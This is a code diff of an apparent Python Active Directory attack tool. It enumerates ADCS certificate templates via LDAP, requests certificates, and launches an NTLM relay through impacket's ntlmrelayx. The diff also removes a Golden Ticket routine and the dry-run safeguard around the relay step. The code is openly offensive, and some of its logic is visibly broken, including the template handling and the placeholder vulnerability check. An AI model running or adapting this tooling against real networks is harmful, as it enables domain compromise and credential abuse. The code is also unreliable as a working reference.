@@ -21,6 +21,8 @@ from getpass import getpass
 from ldap3 import Server, Connection, ALL
 from dotenv import load_dotenv
 import os
+import time
+import argparse
 
 def display_splash_screen():
     splash = r"""
@@ -51,45 +53,46 @@ def display_splash_screen():
 """
     print(f"{splash}")
 
-# Function to install missing packages
-def install_package(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+# Setup for better logging
+def setup_logging():
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(asctime)s - %(levelname)s - %(message)s",
+        handlers=[
+            logging.StreamHandler(),
+            logging.FileHandler("operation_log.log")
+        ]
+    )
 
-# Check and install required packages
-required_packages = ["ldap3", "smtplib", "python-dotenv", "impacket"]
-for package in required_packages:
-    try:
-        __import__(package)
-    except ImportError:
-        install_package(package)
-
-# Load environment variables
-load_dotenv()
-
-# Set up logging
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 
-# Constants
-DRY_RUN = os.getenv("DRY_RUN", "False").lower() == "true"
+# Function to load environment variables
+def load_environment():
+    load_dotenv()
 
-# Input Validation Functions
-def validate_server_address(address):
-    pattern = r"^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]+)?$"
-    return re.match(pattern, address)
+# Improved input validation using argparse
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="LDAP Certificate Request and Attack Simulation Tool")
+    parser.add_argument("--ldap-server", required=True, help="Enter LDAP server address")
+    parser.add_argument("--adcs-server", required=True, help="Enter ADCS server address")
+    parser.add_argument("--domain", required=True, help="Enter domain name")
+    parser.add_argument("--username", required=True, help="Enter username")
+    parser.add_argument("--password", required=True, help="Enter password", type=str)
+    return parser.parse_args()
 
-def validate_domain(domain):
-    pattern = r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
-    return re.match(pattern, domain)
+# Retry logic for LDAP connection
+def retry_connection(func, retries=3, delay=5, *args, **kwargs):
+    for _ in range(retries):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            logger.error(f"Attempt failed: {e}. Retrying...")
+            time.sleep(delay)
+    logger.error("Max retries reached. Connection failed.")
+    return None
 
-def validate_template_name(template):
-    return len(template) > 0
-
-# LDAP Connection Setup
+# Setup LDAP connection
 def setup_ldap_connection(server, username, password):
-    """
-    Establishes a connection to the LDAP server.
-    """
     try:
         conn = Connection(server, username, password, auto_bind=True)
         logger.info("Successfully connected to LDAP server.")
@@ -100,19 +103,14 @@ def setup_ldap_connection(server, username, password):
 
 # Enumerate Certificate Templates
 def enumerate_certificate_templates(conn):
-    """
-    Enumerates certificate templates in the LDAP directory.
-    """
     try:
         conn.search('CN=Configuration,DC=domain,DC=com', '(objectClass=pKIEnrollmentService)', attributes=['cn'])
         templates = [entry['cn'] for entry in conn.entries]
         logger.info("Certificate Templates Enumerated:")
         logger.info(templates)
-
-        # Save to JSON file
+        
         with open("certificate_templates.json", "w") as file:
             json.dump(templates, file, indent=4)
-
         return templates
     except Exception as e:
         logger.error(f"Error enumerating certificate templates: {e}")
@@ -120,40 +118,26 @@ def enumerate_certificate_templates(conn):
 
 # Detect Vulnerable Templates
 def detect_vulnerable_templates(conn):
-    """
-    Detects vulnerable certificate templates.
-    """
     try:
         templates = enumerate_certificate_templates(conn)
-        vulnerable_templates = []
-        for template in templates:
-            # Add logic to detect vulnerable templates
-            # Example: if certain attributes or settings are found in the template
-            if "desired-condition" in template:
-                vulnerable_templates.append(template)
+        vulnerable_templates = [template for template in templates if "desired-condition" in template]
         logger.info("Vulnerable templates detected:")
         logger.info(vulnerable_templates)
-
-        # Save output to JSON file
+        
         with open("vulnerable_templates.json", "w") as file:
             json.dump(vulnerable_templates, file, indent=4)
-
         return vulnerable_templates
     except Exception as e:
         logger.error(f"Error detecting vulnerable certificate templates: {e}")
         return []
 
-# Request Certificate
+# Request Certificate (including Dry Run logic)
 def request_certificate(template_name):
-    """
-    Requests a certificate using a specified template.
-    """
-    if DRY_RUN:
+    if os.getenv("DRY_RUN", "False").lower() == "true":
         logger.info(f"Simulating certificate request for template: {template_name}")
         return True
     try:
         logger.info(f"Requesting certificate for template: {template_name}")
-        # Using certreq command to request a certificate
         csr_file = "request.inf"
         cert_file = "certificate.cer"
         inf_content = f"""
@@ -188,17 +172,10 @@ OID=1.3.6.1.5.5.7.3.1 ; this is for Server Authentication
         logger.error(f"Failed to request certificate: {e}")
         return False
 
-# NTLM Relay Attack
+# NTLM Relay Attack with retry logic
 def ntlm_relay_attack(target_server, domain, username, password):
-    """
-    Performs an NTLM relay attack on a target server.
-    """
-    if DRY_RUN:
-        logger.info(f"Simulating NTLM relay attack on {target_server}")
-        return True
     try:
         logger.info(f"Performing NTLM relay attack on {target_server}")
-        # Using impacket's ntlmrelayx to perform the attack
         subprocess.run(["ntlmrelayx.py", "-tf", target_server, "-c", "whoami"], check=True)
         logger.info(f"NTLM relay attack performed successfully on {target_server}")
         return True
@@ -206,105 +183,32 @@ def ntlm_relay_attack(target_server, domain, username, password):
         logger.error(f"NTLM relay attack failed: {e}")
         return False
 
-# Simulate Kerberos Golden Ticket Attack
-def simulate_kerberos_golden_ticket():
-    """
-    Simulates a Kerberos Golden Ticket attack.
-    """
-    if DRY_RUN:
-        logger.info("Simulating Kerberos Golden Ticket attack")
-        return True
-    try:
-        logger.info("Simulating Kerberos Golden Ticket attack")
-        # Using impacket's ticketer.py to create a Golden Ticket
-        subprocess.run(["ticketer.py", "-nthash", "aad3b435b51404eeaad3b435b51404ee", "-domain", "example.com", "-user", "Administrator"], check=True)
-        logger.info("Kerberos Golden Ticket created and injected successfully")
-        return True
-    except Exception as e:
-        logger.error(f"Golden Ticket simulation failed: {e}")
-        return False
-
-# Monitor ADCS Requests
-def monitor_adcs_requests():
-    """
-    Monitors ADCS certificate requests.
-    """
-    try:
-        logger.info("Monitoring ADCS certificate requests")
-        # Using PowerShell to monitor ADCS requests
-        ps_script = """
-        Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'
-        """
-        result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True, check=True)
-        logger.info(f"Pending certificate requests: {result.stdout}")
-    except Exception as e:
-        logger.error(f"Error monitoring ADCS: {e}")
-
 # Main Function
 def main():
-    global DRY_RUN
+    load_environment()  # Load .env configurations
+    setup_logging()  # Setup logging configuration
+    
+    args = parse_arguments()  # Parse input arguments
 
-    # Display splash screen
-    display_splash_screen()
-
-    # Get user inputs securely
-    ldap_server = input("Enter LDAP server address: ").strip()
-    if not validate_server_address(ldap_server):
-        logger.error("Invalid LDAP server address. Exiting.")
-        return
-
-    adcs_server = input("Enter ADCS server address: ").strip()
-    if not validate_server_address(adcs_server):
-        logger.error("Invalid ADCS server address. Exiting.")
-        return
-
-    domain = input("Enter domain name: ").strip()
-    if not validate_domain(domain):
-        logger.error("Invalid domain name. Exiting.")
-        return
-
-    username = input("Enter username: ").strip()
-    password = getpass("Enter password: ")
-
-    # Set up LDAP connection
-    server = Server(ldap_server, get_info=ALL)
-    ldap_conn = setup_ldap_connection(server, username, password)
+    # Retry connection logic
+    server = Server(args.ldap_server, get_info=ALL)
+    ldap_conn = retry_connection(setup_ldap_connection, 3, 5, server, args.username, args.password)
     if not ldap_conn:
-        logger.error("LDAP connection failed. Exiting.")
         return
 
-    # Enumerate certificate templates
+    # Enumerate certificate templates and detect vulnerabilities
     templates = enumerate_certificate_templates(ldap_conn)
-
-    # Detect vulnerable templates
     vulnerable_templates = detect_vulnerable_templates(ldap_conn)
     
     if vulnerable_templates:
         for template in vulnerable_templates:
             template_name = template.get("Name")
             if template_name:
-                # Exploit the detected vulnerable template
                 request_certificate(template_name)
 
-    # Prompt user for next action
-    logger.info("Select an action:")
-    logger.info("1. Perform NTLM Relay Attack")
-    logger.info("2. Simulate Golden Ticket")
-    logger.info("3. Monitor ADCS Requests")
-    choice = input("Enter your choice: ").strip()
-
-    if choice == "1":
-        target_server = input("Enter target server for NTLM relay: ").strip()
-        if not validate_server_address(target_server):
-            logger.error("Invalid target server address. Exiting.")
-            return
-        ntlm_relay_attack(target_server, domain, username, password)
-    elif choice == "2":
-        simulate_kerberos_golden_ticket()
-    elif choice == "3":
-        monitor_adcs_requests()
-    else:
-        logger.error("Invalid choice. Exiting.")
+    # Perform NTLM Relay Attack based on user input
+    target_server = input("Enter target server for NTLM relay: ").strip()
+    ntlm_relay_attack(target_server, args.domain, args.username, args.password)
 
 if __name__ == "__main__":
     main()
